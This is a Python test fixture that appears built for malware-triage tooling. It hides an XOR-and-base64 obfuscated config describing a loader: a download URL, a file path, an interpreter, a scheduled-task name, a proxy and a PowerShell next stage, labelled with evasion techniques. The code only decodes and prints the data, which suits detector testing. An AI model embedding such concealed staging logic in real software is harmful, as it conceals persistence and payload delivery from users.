#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_a11973b9 = "TgwPURoTDxIeDFIaHA0KEAwaDUIaGB4LDCALBxoRA09PSUhMRU5RT1FPUUhNTkILERYQDxsRGiAGBxANDwNMGklLGU9PGx1JUhoLHhsPKhIaCwwGLEIaEh4RIBQMHgsDGgcaUREQFwsGD1BMGklLGU9PGx1JUhEQFwsGL1AeCx47Eh4NGBANL1BFPEIXCx4PIA0aCxoNDw0aCxEWAwYPUUwaSUsZT08bHUlSGgseGw8KUVAdHjMMDBoNCxEKN1AeCx47Eh4NGBANL1BFPEIXCx4PIBoTFhkDTBpJSxlPTxsdSVAREBcLBi8MDBoNCxEKN0ILERoYHiANGgwKAwYPURtJHUxOHEtLUBsWEx4JERZRGhMPEh4HGlFMGklLGU9PGx1JUFBFDA8LCxdCEw0KA0waSUsZT08bHUlSERgWHg8SHhxCGxYgERgWHg8SHhwDDRALDxYNHAwaGyAaHBYJDRoMQhEWHhccIAwIEBsRFggDGhwWCQ0aDCAMCBAbERYIIBoHGk0GD0INGhYNDR4cAxgRFgsKEA0gERAWCw8aHAcaQhEQFgseHAwKGR0QAxgRFhsRFh0gDAoNEx4IQgceCxEGDANKQgsRChAcIBoYHgsMAxkZEBsRHhcgDRobHhATIBEQFwsGDxxCDRoLDx4bHgMMDBocEA0PIBccCx4PDBYbUxoTFhkgGgsWDQhTGxobGxodEhogGhsQHBobUxoLEBIaDSAaDRYKDhweUwsMEBcgGhMWGRAND0IMDxoLDANNQgk="
CODEC_a11973b9 = "base64_literal|reverse_then_xor|7f"

def load_a11973b9():
    return base64.b64decode(MATERIAL_a11973b9)

def decode_a11973b9(item1):
    return bytes(value ^ 127 for value in reversed(item1))

def recover_a11973b9():
    item4 = "left" if 2 > 1 else "right"
    item6 = decode_a11973b9
    item2 = item6(load_a11973b9())
    item3 = item2.decode("ascii", "strict")
    return item3

def inspect_a11973b9():
    view = memoryview(recover_a11973b9().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_a11973b9():
    return surface if (surface := ("walrus_binding", "exception_routing", "py2exe_windows_service", "service_descriptor")) else ()

def obfuscation_a11973b9():
    try:
        {}["missing"]
    except KeyError:
        return "exception_routing"

def plan_a11973b9():
    fields = dict(item.split("=", 1) for item in inspect_a11973b9().split("|"))
    analysis_surface = surface_a11973b9()
    obfuscation_surface = obfuscation_a11973b9()
    operation_plan = ("cpython_loader_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_a11973b9())
